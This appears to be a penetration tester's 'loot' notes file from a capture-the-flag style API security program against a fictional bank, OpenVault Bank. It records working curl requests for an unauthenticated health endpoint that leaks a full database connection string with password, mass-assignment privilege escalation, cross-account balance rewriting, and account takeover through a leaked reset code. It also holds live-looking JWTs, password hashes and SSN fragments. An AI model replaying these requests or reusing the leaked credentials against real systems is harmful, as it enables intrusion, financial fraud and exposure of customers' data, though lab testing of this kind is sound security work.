---
date: 2026-04-03
program: OpenVault Bank (APISec)
---

# Loot

## Attacker Account
- Email: attacker@pwned.io | Password: P@ssw0rd123! | user_id: 1007
- Customer JWT (role:customer): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDA3IiwiZW1haWwiOiJhdHRhY2tlckBwd25lZC5pbyIsInJvbGUiOiJjdXN0b21lciIsInNjb3BlIjoiYWNjb3VudHM6cmVhZCBiYWxhbmNlczpyZWFkIiwiaWF0IjoxNzc1MjIxOTI0LCJleHAiOjE3NzUyMjU1MjR9.yMGL1P3AEGB_88Hc_-2mrZeyS0fAzC1w2dTBTnA_GyE
- Admin JWT (role:admin): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDA3IiwiZW1haWwiOiJhdHRhY2tlckBwd25lZC5pbyIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiYWNjb3VudHM6cmVhZCBiYWxhbmNlczpyZWFkIiwiaWF0IjoxNzc1MjIxOTQ3LCJleHAiOjE3NzUyMjU1NDd9.Il3krs59_9UoN6LAKzJYQHJEV6bDaipHlk6slZrj4c8

## P1-A: DB Credentials via /health (Unauthenticated)
- Leaked: postgresql://postgres.ljvmdzjbrmodpmheugie:C7JjqMazeea49LQw@aws-1-us-west-1.pooler.supabase.com:6543/postgres
- Flag: OVB{h3alth_ch3ck_l3aks_ev3rything}
- curl: curl -sk https://web-production-16ec6a.up.railway.app/api/v1/health

## P1-B: Mass Assignment → Privilege Escalation
- PUT /api/v1/profile {"role":"admin"} → role changed to admin
- curl: curl -sk -X PUT .../api/v1/profile -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"role":"admin"}'

## P1-C: BOLA — Read/Write Any Account
- GET /api/v1/accounts/2001 with user 1007 token → returns alice (1001) account data
- PUT /api/v1/accounts/2001 {"balance":"9999999.00"} → balance set to $9,999,999
- Works with CUSTOMER-level token (no admin required)
- curl READ:  curl -sk .../api/v1/accounts/2001 -H "Authorization: Bearer CUSTOMER_TOKEN"
- curl WRITE: curl -sk -X PUT .../api/v1/accounts/2001 -H "Authorization: Bearer TOKEN" -d '{"balance":"9999999.00","credit_limit":"9999999.00"}'

## P1-D: Password Reset Code Leaked in Response → Full ATO
- POST /auth/reset-request {"email":"alice@ovb.com"} → {"debug_code":"338"} returned!
- POST /auth/reset-confirm {"email":"alice@ovb.com","code":"338","new_password":"H4cked!9999"} → success
- POST /auth/token {"email":"alice@ovb.com","password":"H4cked!9999"} → JWT for alice returned
- Alice JWT (post-ATO): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIi...

## P1-E: Admin Data Dump (post escalation)
- GET /admin/users → 7 users + bcrypt hashes
  [1001] alice@ovb.com | $2b$12$bkMTJf3X5SttlZVm5RA1Vu...
  [1002] bob@ovb.com   | $2b$12$jc7EJXovaPAcVF7HToNym...
  [1003] carol@ovb.com | $2b$12$lKaFt4XGgjcOBngOPGS7E...
  [1004] admin@ovb.com | $2b$12$E8W7sr3iNSIqFLkXwPxlhO...
- GET /admin/accounts → 11 accounts, SSN last4 exposed
  alice SSN:4721 | bob SSN:8834 | carol SSN:2219

## Demo Users (seeded)
| ID | Email | Role | SSN_last4 |
|----|-------|------|-----------|
| 1001 | alice@ovb.com | customer | 4721 |
| 1002 | bob@ovb.com | customer | 8834 |
| 1003 | carol@ovb.com | customer | 2219 |
| 1004 | admin@ovb.com | admin | unknown |
